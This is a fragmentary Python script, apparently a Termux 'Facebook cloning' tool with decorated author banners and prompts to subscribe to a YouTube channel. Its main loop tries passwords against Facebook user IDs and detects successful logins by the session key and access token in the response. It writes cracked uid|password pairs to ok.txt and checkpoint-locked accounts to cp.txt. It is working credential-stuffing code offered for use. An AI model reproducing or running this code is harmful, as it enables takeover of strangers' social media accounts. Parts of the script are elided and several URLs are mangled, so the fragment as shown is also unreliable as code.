...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m ❥✿𝄞RAJU𝄞❥✿ queen \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 

 ───────────────────────────────────────────────────────×

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ❥✿𝄞RAJU𝄞❥✿ queen \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/❥✿𝄞RAJU𝄞❥✿sharma09 \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./sonali.rathod.14473426 \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/❥✿𝄞RAJU𝄞❥✿sharma09/run.txt/blob/main/run.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] FACEBOOK :  https://www.facebook.com/sonali.rathod.14473426")
...
def notice():
	...
	runtxt("\033[0;97m Key Approval ke Lai YouTube chanaL subscribe  Krein >> %s%s"%(G,basesplit))
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ❥✿𝄞RAJU𝄞❥✿ \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Termux Raju \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./❥✿𝄞RAJU𝄞❥✿ \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/c/LitonLucky"])
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=❥✿𝄞RAJU𝄞❥✿=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=❥✿𝄞RAJU𝄞❥✿=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=❥✿𝄞RAJU𝄞❥✿=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=❥✿𝄞RAJU𝄞❥✿=CP=>]  %s|%s\n"%(uid, pw))
